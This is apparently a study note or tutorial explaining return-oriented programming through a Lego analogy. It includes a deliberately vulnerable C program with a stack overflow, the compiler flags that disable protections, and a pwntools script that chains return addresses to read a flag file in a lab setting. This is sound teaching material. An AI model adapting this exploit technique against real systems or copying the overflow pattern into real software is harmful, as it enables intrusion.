# Return Oriented Programming - Binary Lego

## Why Binary Legos

Legos come with a whole bunch of blocks and when following the instructions we turn all these bricks into something that we wanted to. If our instruction booklet was modified we would build something completely different with the same blocks and this is a good analogy for return oriented programming. Bytes in `.text` can be pointed to with a stack based overflow and this leads to actions being taken by the program, the attacker can force the CPU to build them into something different that wasn't intended by the program.

## Conceptual Analogy (on source code)

We have an example program that asks for the users name. It also has code that will open the flag file, and code which will open code which isn't the flag file.

Example program (`rop-example.c`):

```c
int main() {
    char name[16];
    read(0, name, 128);
}
int foo() {
    return open("/flag", 0);
}
int bar() {
    int x = open("/notflag", 0);
    sendfile(1, x, 0, 1024);
}
```

Looking here we see there is a buffer overflow in main, so we could overwrite name to 16 `A`'s then we could overwrite the return to `foo()` which will return our flag file then we can jump to line 10 as our next return address and use the `/flag` file descriptor as `x`.

To compile this program we must disable stack canaries to pass into the overflow and turn off PIE/ASLR for the binary layout.

```bash
gcc -Wno-implicit-function-declaration -fno-stack-protector -no-pie -o rop-example rop-example.c
```

To exploit this we start by disassembling the `rop-example` program. Looking at the `objdump` we can see that we will need to send 16 bytes to overflow the read portion, then 8 bytes to overflow the RBP then 8 more for the return address.

Looking at `foo` and `bar`

![](Attachments/Pasted%20image%2020261023180331.png)

We see that at `11c0` we `mov esi,eax` and `foo` returns into `eax`. `esi` at `11c0` is the file descriptor for `sendfile` so once `foo` run's we can then jump to `11c0`.

We can use `pwntools` to fill up the 16 bytes then send 8 for RBP. After that we can set the next 8 bytes to `foo`'s address skipping the `push rbp` so we go to `401174`, adding 8 more to include the `pop rbp` at the end of `foo` and the following 8 bytes to be `4011c0` where we then should read the file.

`simple-rop-example-solution.py`

```python
from pwn import *

context.binary = "/home/kali/reversing/yellow-belt/rop/learning/rop-example"
p = context.binary.process()

p.send(
    b"A"*16 +
    b"A"*8 +
    p64(0x401174) +
    b"A"*8 +
    p64(0x4011c0)
)

print(p.readall().decode('utf-8'))
```

If we run the above script we see the following and read the flag.

This is a simple example of return oriented programming.

## ROP by induction

Step 0: overflow the stack

Step n: by controlling the return address, you trigger a gadget:

Step n+1: when the gadget returns, it returns to an address you control (i.e., the next gadget)

 By chaining these gadgets, you can perform arbitrary actions in a ***ropchain***!

## Takeaway: ROP is basically Shellcode

A ROP gadget is equivalent to shellcode, but the instructions available to you are WEIRD...

Hacker term: Programming the Weird Machine

Related Concept: accidental Turing completeness, there are tons of things that turned out to be accidentally complete.

Fundamentally:
- We get to choose from a set of bizarre meta-instructions already in memory
- You can chain instructions using `ret`
- Same lego pieces but a new result.

## ROP is FUN!

We are taking programs and exploiting a vulnerability to break the program apart and crafting it back together to make a chain to cause pieces of the original program into something they weren't intended to do... we are sculpting new functionality.
